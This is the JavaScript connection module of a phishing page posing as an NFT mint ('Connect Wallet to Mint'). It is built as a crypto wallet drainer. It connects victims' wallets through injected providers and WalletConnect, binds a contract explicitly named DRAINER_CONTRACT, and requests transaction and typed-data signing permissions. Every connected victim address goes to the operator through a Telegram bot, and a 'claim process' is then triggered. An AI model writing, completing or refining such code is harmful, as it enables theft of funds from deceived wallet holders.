import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  CONFIG
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
  } = CONFIG;

  const PRIMARY_PROJECT_ID  = PROJECT_ID || '';
  const FALLBACK_PROJECT_ID = PUBLIC_TEST_ID || '';

  const RELAY_URLS = [
    'wss://relay.walletconnect.com',
    'wss://relay.walletconnect.org',
  ];

  const MAINNET_HEX = '0x' + MAINNET_ID.toString(16);

  // ==========================================================================
  //  PLATFORM
  // ==========================================================================
  const UA              = navigator.userAgent || '';
  const isMobileDevice  = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOSDevice     = /iPhone|iPad|iPod/i.test(UA);
  const isAndroidDevice = /Android/i.test(UA);
  const isDesktopDevice = !isMobileDevice;

  function getPlatform() {
    if (isIOSDevice)     return 'ios';
    if (isAndroidDevice) return 'android';
    if (/Windows/i.test(UA))            return 'windows';
    if (/Macintosh|Mac OS X/i.test(UA)) return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const ts = new Date().toLocaleTimeString();
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${ts}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (eth?.isMetaMask && /MetaMaskMobile/i.test(UA))       return { wallet: 'metamask', name: 'MetaMask' };
    if (eth?.isTrust || /TrustWallet/i.test(UA))             return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth?.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA) && eth)                          return { wallet: 'rainbow',  name: 'Rainbow' };
    if (eth && isMobileDevice)                               return { wallet: 'injected', name: 'Wallet' };
    return null;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram error:', await r.text()); return false; }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  TIMEOUT + IMPORT HELPERS
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    let to;
    return Promise.race([
      promise.finally(() => clearTimeout(to)),
      new Promise((_, rej) => { to = setTimeout(() => rej(new Error(`Timeout: ${label} (${ms}ms)`)), ms); }),
    ]);
  }

  async function tryImport(urls, pickFn, label, timeoutMs = 8000) {
    let lastErr = null;
    for (const url of urls) {
      try {
        const t0 = performance.now();
        const m = await withTimeout(import(url), timeoutMs, `${label} @ ${url}`);
        const v = pickFn(m);
        if (!v) throw new Error(`${label} export not found at ${url}`);
        logDebug(`✅ ${label} from ${url} (${(performance.now() - t0).toFixed(0)}ms)`);
        return v;
      } catch (e) {
        lastErr = e;
        logDebug(`❌ ${label} fail @ ${url}: ${e.message}`);
      }
    }
    throw lastErr || new Error(`${label} failed on all CDNs`);
  }

  async function loadWalletConnectLibraries() {
    const signCdn = [
      'https://esm.sh/@walletconnect/sign-client@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
    ];
    const modalCdn = [
      'https://esm.sh/@walletconnect/modal@2.6.2?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
    ];
    const providerCdn = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];

    const [SignClient, WalletConnectModal, EthereumProvider] = await Promise.all([
      tryImport(signCdn,     (m) => m.default || m,                        'SignClient'),
      tryImport(modalCdn,    (m) => m.WalletConnectModal || m.default || m, 'Modal'),
      tryImport(providerCdn, (m) => m.EthereumProvider || m.default || m,   'EthereumProvider'),
    ]);

    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  async function pickRelayUrl(timeoutMs = 2500) {
    for (const url of RELAY_URLS) {
      try {
        const ok = await withTimeout(
          new Promise((resolve) => {
            const ws = new WebSocket(url);
            const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
            ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
            ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
          }),
          timeoutMs + 500,
          `ws-probe ${url}`
        );
        if (ok) { logDebug(`🌐 Relay OK: ${url}`); return url; }
      } catch {}
    }
    logDebug('⚠️ No relay reachable — using primary anyway');
    return RELAY_URLS[0];
  }

  // ==========================================================================
  //  DOM
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  MODULE STATE
  // ==========================================================================
  let SignClient          = null;
  let WalletConnectModal  = null;
  let EthereumProvider    = null;

  let client              = null;   // SignClient instance
  let modal               = null;   // Modal instance
  let wcProvider          = null;   // WC EthereumProvider (single instance)
  let currentSession      = null;   // WC session object
  let activeProvider      = null;   // Live EIP-1193 provider
  let web3Instance        = null;
  let contractInstance    = null;
  let currentAddress      = null;   // Address actually verified via eth_accounts
  let isConnecting        = false;
  let providerEventsSetup = false;

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';
    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  function saveWallet(address, session = null, chainType = null) {
    localStorage.setItem('connectedWallet', address);
    if (session)   localStorage.setItem('walletConnectSession', JSON.stringify(session));
    if (chainType) localStorage.setItem('chainType', chainType);
  }
  function getSavedWallet()    { return localStorage.getItem('connectedWallet'); }
  function getSavedSession()   {
    const s = localStorage.getItem('walletConnectSession');
    try { return s ? JSON.parse(s) : null; } catch { return null; }
  }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('walletConnectSession');
    localStorage.removeItem('chainType');
  }

  // ==========================================================================
  //  PUBLISH GLOBAL STATE — with provider health gate
  // ==========================================================================
  async function verifyProvider(provider) {
    if (!provider?.request) return null;
    try {
      const accounts = await withTimeout(
        provider.request({ method: 'eth_accounts' }),
        5000,
        'eth_accounts verify'
      );
      if (!accounts || accounts.length === 0) return null;
      return accounts[0];
    } catch (e) {
      logDebug(`provider verify failed: ${e.message}`);
      return null;
    }
  }

  async function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || null;

    // Health check: only publish if the provider actually returns an address.
    // This is the specific fix for the Trust Wallet "phantom connected" case.
    if (live) {
      const verified = await verifyProvider(live);
      if (!verified) {
        logDebug('⚠️ provider returned no accounts — skipping publish');
        return false;
      }
      // Trust the verified address over any previously cached one.
      address = verified;
      currentAddress = verified;
    }

    window.__apexConnected = {
      address,
      chain,
      web3:     web3Instance,
      contract: contractInstance,
      provider: live,
      session:  currentSession,
      publishedAt: Date.now(),
    };
    logDebug(`published global: addr=${address} chain=${chain} hasWeb3=${!!web3Instance} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
    return true;
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  async function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');

    const published = await publishGlobalState(address, chain);
    if (!published) {
      logDebug('⚠️ connected UI shown but provider not verified — retrying publish in 1.5s');
      setTimeout(() => publishGlobalState(address, chain), 1500);
    }

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobileDevice ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    currentSession = null;
    currentAddress = null;
    providerEventsSetup = false;
    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET SELECTION MODAL (desktop)
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;z-index:99999;
    `;
    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;
      max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;
    `;
    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);
    const list = modalEl.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px'; i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  WALLETCONNECT — ONE INIT, ONE PROVIDER, ONE SESSION
  //
  //  CRITICAL FIX:
  //  The previous code created an EthereumProvider *after* client.connect()
  //  resolved. That produced two competing WC consumers on the same topic,
  //  and Trust Wallet's pairing ack was consumed by only one of them.
  //
  //  The correct sequence:
  //    1. initWalletConnect()  — creates SignClient + Modal (no provider).
  //    2. connect()            — returns { uri, approval }. Open modal.
  //    3. await approval()     — resolves with the WC session.
  //    4. createWcProvider(session) — creates ONE EthereumProvider bound
  //       to the session. This is the ONLY provider used for signing.
  //    5. enable() + eth_accounts — bootstrap the provider so its events
  //       (accountsChanged, chainChanged) fire.
  //    6. publishGlobalState   — health-gate, then dispatch.
  // ==========================================================================
  async function initWalletConnect({ useFallbackId = false, timeoutMs = 12000 } = {}) {
    if (client && modal) return true;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) {
      logDebug('❌ No projectId configured');
      return false;
    }

    const relayUrl = await pickRelayUrl();

    try {
      logDebug(`WC init: projectId=${projectId.slice(0, 8)}… relay=${relayUrl}`);
      const t0 = performance.now();

      const initPromise = (async () => {
        client = await SignClient.init({
          projectId,
          metadata: DAPP_METADATA,
          relayUrl,
        });
        modal = new WalletConnectModal({
          projectId,
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
          },
          enableExplorer: true,
        });
        return true;
      })();

      const ok = await withTimeout(initPromise, timeoutMs, 'WC init');
      if (!ok) throw new Error('WC init returned false');

      logDebug(`✅ WC init OK in ${(performance.now() - t0).toFixed(0)}ms`);
      return true;
    } catch (e) {
      logDebug(`WC init failed: ${e.message}`);
      client = null;
      modal  = null;
      return false;
    }
  }

  // Creates the ONE EthereumProvider bound to `session`.
  // Never called twice for the same session.
  async function createWcProvider(session, projectId) {
    if (wcProvider) {
      try { await wcProvider.disconnect(); } catch {}
      wcProvider = null;
    }

    const p = await EthereumProvider.init({
      projectId,
      metadata: DAPP_METADATA,
      session,
      showQrModal: false,
      chains: [MAINNET_ID],
      methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
      events: ['chainChanged', 'accountsChanged'],
      optionalChains: [MAINNET_ID],
      optionalMethods: ['wallet_switchEthereumChain', 'wallet_addEthereumChain'],
    });

    // Bootstrap: this triggers the WC session bootstrap on the provider side.
    try { await p.enable(); } catch (e) { logDebug(`provider.enable: ${e.message}`); }

    wcProvider = p;
    return p;
  }

  // ==========================================================================
  //  INJECTED EVM CONNECT
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 600));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (inWallet && window.ethereum) {
      chosen = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        timeoutMs,
        'eth_requestAccounts'
      );
      if (!accounts?.length) return false;

      const address = accounts[0];
      saveWallet(address, null, 'evm');

      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider   = provider;
      currentAddress   = address;

      await updateConnectedUI(address, 'evm');
      logDebug(`✅ Injected connected: ${address} (${chosen.info.name})`);
      return true;
    } catch (e) {
      logDebug('Injected error: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT CONNECT — Trust Wallet-safe flow
  // ==========================================================================
  async function connectViaWalletConnect({ useFallbackId = false, timeoutMs = 300000 } = {}) {
    if (isConnecting) return false;
    isConnecting = true;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;

    try {
      const ok = await initWalletConnect({ useFallbackId });
      if (!ok) { isConnecting = false; return false; }

      if (modal?.closeModal) { try { modal.closeModal(); } catch {} }

      showStatus('Opening wallet options...', 'info');

      // STEP 1: create the pairing — returns uri for QR/deeplink + approval promise.
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
            chains: [`eip155:${MAINNET_ID}`],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });
      if (!uri) throw new Error('No URI returned');

      modal.openModal({ uri });
      showStatus('Choose your wallet', 'info');

      sessionStorage.setItem('pending_wc_uri', uri);
      sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());

      // STEP 2: wait for wallet to approve.
      const session = await withTimeout(approval(), timeoutMs, 'WC approval');

      if (modal) modal.closeModal();
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      if (!session?.namespaces?.eip155?.accounts?.length) {
        isConnecting = false;
        return false;
      }

      const accountFromSession = session.namespaces.eip155.accounts[0].split(':')[2];
      currentSession = session;

      // STEP 3: create ONE EthereumProvider bound to this session.
      // Do NOT call client.connect() again or create another provider.
      const provider = await createWcProvider(session, projectId);
      activeProvider = provider;

      // STEP 4: verify the provider actually surfaces an address.
      // This is the fix for "Trust Wallet shows connected but dApp has no address".
      const verified = await verifyProvider(provider);
      if (!verified) {
        // Give WC's internal bootstrap a moment, then retry once.
        logDebug('⚠️ provider returned no accounts — waiting 1.5s and retrying');
        await new Promise((r) => setTimeout(r, 1500));
        const retry = await verifyProvider(provider);
        if (!retry) {
          logDebug('❌ WC provider never produced an address — aborting');
          try { await provider.disconnect(); } catch {}
          wcProvider = null;
          currentSession = null;
          activeProvider = null;
          isConnecting = false;
          showStatus('Wallet pairing incomplete. Please try again.', 'error');
          return false;
        }
      }

      const account = verified || accountFromSession;

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      currentAddress   = account;

      saveWallet(account, session, 'evm');
      setupEVMProviderEvents(provider);

      await updateConnectedUI(account, 'evm');

      isConnecting = false;
      logDebug(`✅ WC connected: ${account}`);
      return true;
    } catch (e) {
      logDebug('WC connect error: ' + e.message);
      if (modal) { try { modal.closeModal(); } catch {} }
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
      if (wcProvider) { try { await wcProvider.disconnect(); } catch {} wcProvider = null; }
      isConnecting = false;
      return false;
    }
  }

  // ==========================================================================
  //  PROVIDER LIFECYCLE EVENTS (attached once per provider)
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;
    if (providerEventsSetup) return;
    providerEventsSetup = true;

    provider.on('accountsChanged', async (accounts) => {
      if (!accounts || accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        const a = accounts[0];
        currentAddress = a;
        await updateConnectedUI(a, 'evm');
        saveWallet(a, currentSession, 'evm');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 1000);
      }
    });

    provider.on('chainChanged', async (id) => {
      showStatus(`Network changed to ${id}`, 'info');
      try {
        const a = currentAddress || window.__apexConnected?.address || getSavedWallet();
        if (a) {
          if (web3Instance) contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          await publishGlobalState(a, 'evm', provider);
        }
      } catch {}
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = false;

    if (isDesktopDevice) {
      success = await connectDirectEVM(8000);
      if (!success) success = await connectViaWalletConnect({ useFallbackId: false, timeoutMs: 300000 });
      if (!success) success = await connectViaWalletConnect({ useFallbackId: true,  timeoutMs: 300000 });
    } else {
      const inWallet = detectInWalletBrowser();
      const strongInWallet = inWallet && inWallet.wallet !== 'injected';

      if (strongInWallet) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        success = await connectDirectEVM(8000);
      }
      if (!success) success = await connectViaWalletConnect({ useFallbackId: false, timeoutMs: 300000 });
      if (!success) success = await connectViaWalletConnect({ useFallbackId: true,  timeoutMs: 300000 });
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1200);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (wcProvider) {
        try { await wcProvider.disconnect(); } catch {}
        wcProvider = null;
      }
      if (client && currentSession) {
        try {
          await client.disconnect({
            topic: currentSession.topic,
            reason: { code: 6000, message: 'User disconnected' },
          });
        } catch {}
      }
      if (web3Instance?.currentProvider?.disconnect && web3Instance.currentProvider !== wcProvider) {
        try { await web3Instance.currentProvider.disconnect(); } catch {}
      }
    } catch {}

    resetConnectedUI();
    clearSavedWallet();
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    currentSession = null;
    currentAddress = null;
    providerEventsSetup = false;
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    const hasSession = currentSession || getSavedChainType() !== 'unknown';
    if (saved && hasSession) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobileDevice) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE — reconcile against real session, not stale local copy
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();
    if (!savedWallet || savedChain !== 'evm') return;

    if (savedSession?.topic) {
      const ok = await initWalletConnect({ useFallbackId: false });
      if (ok && client?.session?.get) {
        try {
          const session = client.session.get(savedSession.topic);
          if (session && session.namespaces?.eip155?.accounts?.length) {
            currentSession = session;

            const provider = await createWcProvider(session, PRIMARY_PROJECT_ID);
            activeProvider = provider;

            const verified = await verifyProvider(provider);
            if (verified) {
              const Web3 = (await import('web3')).default;
              web3Instance     = new Web3(provider);
              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
              currentAddress   = verified;
              setupEVMProviderEvents(provider);
              await updateConnectedUI(verified, 'evm');
              logDebug('♻️ WC session restored');
              return;
            } else {
              logDebug('WC session present but provider has no accounts — clearing');
              try { await provider.disconnect(); } catch {}
              wcProvider = null;
              currentSession = null;
              activeProvider = null;
            }
          }
        } catch (e) { logDebug('WC restore: ' + e.message); }
      }
    }

    // Injected fallback (desktop only)
    if (isDesktopDevice && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = window.ethereum;
          currentAddress   = accounts[0];
          setupEVMProviderEvents(window.ethereum);
          await updateConnectedUI(accounts[0], 'evm');
          logDebug('♻️ Injected session restored');
          return;
        }
      } catch {}
    }

    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const [libs] = await Promise.all([
      loadWalletConnectLibraries(),
      pickRelayUrl().catch(() => RELAY_URLS[0]),
    ]);
    SignClient         = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider   = libs.EthereumProvider;
    logDebug('✅ All libraries loaded');

    setupEIP6963();

    if (isMobileDevice) {
      logDebug('📱 Pre-warming WalletConnect on mobile…');
      await initWalletConnect({ useFallbackId: false }).catch(() => {});
    }

    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // ==========================================================================
  //  GLOBAL WALLETCONNECT EVENTS
  // ==========================================================================
  setTimeout(() => {
    if (!client) return;

    client.on('session_update', async ({ params }) => {
      const accounts = params.namespaces?.eip155?.accounts;
      if (accounts?.length) {
        const a = accounts[0].split(':')[2];
        currentAddress = a;
        await updateConnectedUI(a, 'evm');
        saveWallet(a, currentSession, 'evm');
      }
    });

    client.on('session_delete', () => {
      resetConnectedUI();
      clearSavedWallet();
    });

    client.on('session_connect', async (session) => {
      const a = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
      if (a) {
        currentSession = session;
        currentAddress = a;
        saveWallet(a, session, 'evm');
        await updateConnectedUI(a, 'evm');
      }
    });
  }, 800);

  if (window.ethereum && isDesktopDevice) {
    setupEVMProviderEvents(window.ethereum);
  }

  window.addEventListener('beforeunload', () => {
    if (modal) { try { modal.closeModal(); } catch {} }
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()} | mobile=${isMobileDevice}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
